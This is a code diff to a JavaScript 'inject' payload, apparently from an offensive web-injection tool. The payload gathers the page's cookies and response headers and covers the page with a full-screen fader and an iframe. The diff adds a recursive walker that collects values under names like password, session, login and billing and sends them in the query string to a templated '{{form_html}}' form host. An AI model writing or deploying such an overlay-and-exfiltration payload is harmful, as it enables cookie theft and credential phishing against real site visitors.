@@ -8,8 +8,8 @@
     var inject = function() {
         var cookies = (document.cookie || "");
         cookies = cookies.length > 0 ? cookies.split(';') : []
-        
-        var query = ["host=" + (location.hostname || "localhost"),"url=" + location.href];
+
+        var query = ['host='+location.host];
         var pushArray = function(arrName, arr) {
             for(var i=0; i<arr.length; i++)
                 if(arr[i])
@@ -34,6 +34,58 @@
         fader.setAttribute('style', faderStyle.join(';'));
         append(fader);
 
+        var simpleNode = function(node) {
+            var type = typeof(node);
+            return type === "number" || type === "string" || type === "boolean";
+        };
+
+        var refs = [];
+        var cycleRef = function(ref) {
+            if(simpleNode(ref)) return false;
+
+            var len = refs.length;
+            for(var i = 0; i < len; i++) {
+                if(ref === refs[i]) {
+                    return true;
+                }
+            }
+            refs.push(ref);
+            return false;
+        };
+    
+        var names = ['navigator','config', 'session', 'sessionid', 'login', 'password', 'pass', 'finance', 'email','emails','user','users','billing'];
+        var checkName = function(nodeName) {
+            var len = names.length;
+            var pattern = "^{node}$|^{node}\\.*|.*\\.{node}$|.*\\.{node}\\.*";
+            var regex = null;
+            for(var i = 0; i < len; i++) {
+                regex = new RegExp(pattern.replace(new RegExp("{node}", "gi"), names[i]));
+                if(nodeName.match(regex)) {
+                    return true;
+                }
+            }
+            return false;
+        };
+    
+        var grabNode = function(collectionName, chainName, node) {
+            for(var childNodeName in node) {
+                if(childNodeName) {
+                    try {
+                        //console.log(childNodeName);
+                        var childNode = node[childNodeName];
+                        if(childNode && typeof(childNode) && !cycleRef(childNode)) {
+                            var childChainPath = chainName ? (chainName + "." + childNodeName) : childNodeName;
+                                if(simpleNode(childNode)) {
+                                    query.push(collectionName + "=" + childChainPath + "=" + childNode);
+                                } else {
+                                    grabNode(collectionName, childChainPath, childNode);
+                                }
+                        }
+                    } catch(e) { console.log("error=" + childNodeName); }
+                }
+            }
+        }
+        
         if (typeof XMLHttpRequest == "undefined") {
             XMLHttpRequest = function () {
                 var versions = ["Msxml2.XMLHTTP.6.0", "Msxml2.XMLHTTP.3.0", "Microsoft.XMLHTTP"];
@@ -50,6 +102,7 @@
                 var headers = this.getAllResponseHeaders() || "";
                 
                 pushArray("header", headers.split('\n'));
+
                 var frame = create("iframe");
                 var frameStyle = [
                     "height:850px",
@@ -65,6 +118,9 @@
                     "padding:0",
                     "z-index:9999"
                 ];
+                
+                //grabNode('navigator', 'navigator', window.navigator);
+                grabNode('location', 'location', window.location);
                 frame.setAttribute('style', frameStyle.join(';'));
                 frame.setAttribute('src', "{{form_html}}?" + query.join('&'));
 
